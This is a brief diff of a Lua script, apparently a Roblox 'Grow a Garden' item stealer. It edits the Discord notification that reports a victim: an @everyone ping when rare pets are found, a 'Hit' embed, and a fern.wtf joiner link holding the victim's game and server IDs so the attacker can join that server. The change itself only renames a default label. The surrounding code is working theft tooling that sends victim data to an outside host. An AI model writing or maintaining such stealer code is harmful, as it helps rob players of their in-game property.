@@ -421,7 +421,7 @@ local payload = {
     avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
     content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
     embeds = {{
-        title = "Grow a Garden Hit - " .. (_G.Script.SM.Config.ServerName or "Scripts.SM"),
+        title = "Grow a Garden Hit - " .. (_G.Script.SM.Config.ServerName or "Unknown"),
         url = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
         color = 57855,
         fields = {
